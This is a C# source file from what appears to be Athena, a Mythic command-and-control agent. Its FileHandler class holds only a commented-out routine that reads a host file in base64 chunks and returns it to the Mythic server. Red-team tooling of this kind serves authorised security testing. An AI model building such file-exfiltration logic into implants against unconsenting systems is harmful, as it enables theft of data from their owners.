using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.IO;

namespace Athena.Commands
{
    public class FileHandler
    {
        ///// <summary>
        ///// Download a file from the host and return it to the Mythic server
        ///// </summary>
        ///// <param name="job">The MythicJob containing the execution parameters</param>
        //public static bool downloadFile(MythicDownloadJob job)
        //{
        //    if (!Globals.downloadJobs.ContainsKey(job.task.id))
        //    {
        //        Globals.downloadJobs.Add(job.task.id, job);
        //        MythicJob j = Globals.jobs[job.task.id];
        //        FileInfo fi = new FileInfo(job.path);
        //        job.total_chunks = GetTotalChunks(job.path, job.chunk_size);
                
        //        if (job.total_chunks == 0)
        //        {
        //            j.errored = true;
        //            j.taskresult = "An error occurred while attempting to access the file.";
        //            j.hasoutput = true;
        //            j.complete = true;
        //        }
                
        //        j.started = true;
        //        j.taskresult = "";
        //        j.hasoutput = true;
                
        //        while (string.IsNullOrEmpty(job.file_id))
        //        {
        //            //Wait until initial request is sent out
        //        }

        //        //Read full contents of file and return them
        //        if (job.total_chunks == 1)
        //        {
        //            j.taskresult = Misc.Base64Encode(File.ReadAllBytes(job.path));
        //            job.chunk_num = 1;
        //            j.complete = true;
        //            j.hasoutput = true;
        //        }
        //        else
        //        {
        //            try
        //            {
        //                //Start with first chunk
        //                job.chunk_num = 1;
        //                FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
        //                using (fileStream)
        //                {
        //                    //Set our buffer to the requested chunk size
        //                    byte[] buffer = new byte[job.chunk_size];
                            
        //                    //Set our file stream to the beginning of the file
        //                    fileStream.Seek(0, SeekOrigin.Begin);
                            
        //                    //Track our bytes
        //                    long totalBytes = 0;

        //                    //Read bytes into the buffer and get the number of bytes read
        //                    int bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                            
        //                    //Update our tracker
        //                    totalBytes += bytesRead;
                            
        //                    //Place the chunk into our task result
        //                    j.taskresult = Misc.Base64Encode(buffer);
        //                    j.hasoutput = true;

        //                    //Wait for the task result to clear out when the chunk is returned
        //                    while (j.taskresult != "") { }

        //                    //Increase our chunk num
        //                    job.chunk_num++;
                            
        //                    //While we're continuing to read bytes
        //                    while (bytesRead > 0)
        //                    {
        //                        //Have a smaller buffer so that we don't include a bunch of nulls
        //                        if (fi.Length - totalBytes < job.chunk_size)
        //                        {
        //                            //Create a smaller buffer
        //                            buffer = new byte[fi.Length - totalBytes];
                                    
        //                            //Read the bytes
        //                            bytesRead = fileStream.Read(buffer, 0, (int)(fi.Length - totalBytes));
        //                            totalBytes += bytesRead;

        //                            //Return task result
        //                            j.taskresult = Misc.Base64Encode(buffer);
        //                            j.hasoutput = true;
        //                        }
        //                        //Read full chunk
        //                        else
        //                        {
        //                            //Read the bytes
        //                            bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
        //                            totalBytes += bytesRead;

        //                            //Return task result
        //                            j.taskresult = Misc.Base64Encode(buffer);
        //                            j.hasoutput = true;
        //                        }

        //                        //Wait until next chunk is ready
        //                        while (j.taskresult != "") { }
        //                        job.chunk_num++;
        //                    }

        //                    //Clean Up
        //                    fileStream.Close();
        //                }
        //            }
        //            catch (Exception e)
        //            {
        //                Misc.WriteError(e.Message);
        //                j.complete = true;
        //                j.errored = true;
        //                j.hasoutput = true;
        //                j.taskresult = e.Message;
        //            }
        //        }
        //    }
        //    return true;
        //}

        ///// <summary>
        ///// Calculate the number of chunks required to download the file
        ///// </summary>
        ///// <param name="file">The path of the file</param>
        ///// <param name="chunksize">The size of each chunk</param>
        //public static int GetTotalChunks(string file, int chunksize)
        //{
        //    try
        //    {
        //        var fi = new FileInfo(file);
        //        int total_chunks = (int)(fi.Length + chunksize - 1) / chunksize;
        //        return total_chunks;
        //    }
        //    catch (Exception e)
        //    {
        //        Misc.WriteError(e.Message);
        //        return 0;
        //    }
        //}
    }
}
